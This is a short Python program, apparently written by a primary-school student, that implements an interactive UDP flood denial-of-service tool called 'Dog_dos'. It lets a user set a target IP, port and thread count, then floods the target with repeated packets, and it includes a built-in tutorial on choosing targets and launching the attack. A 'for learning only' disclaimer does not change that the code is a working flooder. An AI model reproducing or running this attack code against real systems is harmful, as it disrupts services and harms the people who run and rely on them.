"""
Author: Lucky Pupil ;
Date:2022.05.01 ;
National: Chinese ;
Project Name: Dos Attack ;
Education: Fifth grade of primary school
"""
import socket
from threading import Thread
import cmd
from sys import exit
from time import sleep

str_byte = "I'm attacking you" * 500
randbyte = str_byte.encode()
so = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
threads = []


class Main(cmd.Cmd):
	prompt = 'Dog_dos>'
	intro = 'This tool is for learning only. Use it in accordance with local laws'
	def __init__(self):
		super(Main).__init__()
		self.thread = 50
		self.port = 80
	def do_tutorial(self,arg):
		'How to use this tool.'
		self.tutorial(arg)

	def do_set_thread_num(self,arg):
		'Example Set the number of attacking processes'
		self.set_thread_num(arg)

	def do_set_port(self,arg):
		'Setting attack Ports'
		self.set_port(arg)

	def do_set_ip(self,arg):
		'Setting the Attack IP address'
		self.set_ip(arg)

	def do_attack(self,arg):
		'Attack function'
		self.attack(arg)

	def do_exit(self,arg):
		'Exit funciton'
		self.exit(arg)

	def exit(self,arg):
		exit(0)

	def tutorial(self,chose):
		print('First, you must set the attack port with the "set_port" command.Generally for 80')
		sleep(1)
		print('In addition, you must use the "set_ip" command to set the target IP address. You can obtain the IP address of the address by using the ping command + url in the Commond command line')
		sleep(1)
		print('Then, you must use the "set_thread_num" command to set the number of attack threads. The more threads, the more efficient the attack is, and the more likely it is to succeed, but not the better.')
		sleep(1)
		print('Finally, use the "attack" command, enter y, you can start the attack, will display the number of attacks, may be blocked by the website administrator, the consequences at your own risk')
	def set_thread_num(self,num):
		self.thread = int(num)
		print('Set thread ', num)

	def set_port(self,num):
		self.port = int(num)
		print('Set port ', num)

	def set_ip(self,ip):
		self.ip = ip
		print('Set IP address ', ip)

	def attack(self,chose):
		chose = input('Do you really want to attack, please make a correct judgment in accordance with the local law seriously, the author (namely Chinese primary school students) will not attack the consequences (confirm input Y, exit input N)')
		if chose == 'y' or chose == 'Y':
			self.true_to_attack() # attack
		elif chose == 'n' or chose == 'N':
			self.exit()
		else:
			print('Please input normally')
			self.attack()

	def true_to_attack_attack(self):
		for i in range(200001):
			try:
				so.sendto(randbyte,(self.ip,self.port))
			except Exception:
				print('You did not set the IP address or did not set the IP address correctly')
				break
			print('This is the',i+1,'attack !') 

	def true_to_attack_thread(self):
		for i in range(1,self.thread+1):
			sleep(0.1)
			send = Thread(target=self.true_to_attack_attack,args=())
			threads.append(send)
			print(i," threads were generated successfully")
		for j in threads:
			j.start()

	def true_to_attack(self):
		self.true_to_attack_thread()


Main().cmdloop()
